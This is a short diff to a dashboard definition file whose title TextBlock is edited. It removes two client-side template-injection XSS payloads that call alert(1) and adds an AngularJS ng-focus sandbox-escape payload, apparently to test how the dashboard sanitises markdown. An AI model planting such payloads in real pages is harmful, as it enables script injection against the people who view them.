@@ -4,9 +4,7 @@ Dashboard untitled_73 {
   block title: TextBlock {
     content: @md # Your title goes here
 <font color="#D2D5DF">(Double click to edit)</font>
-<a>test</a>
-<p v-show="_createBlock.constructor`alert(1)`()">
-<p>{{constructor.constructor('alert(1)')()}}</p>;;
+<input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">;;
   }
   block guide: TextBlock {
     content: @md <div class="flex">
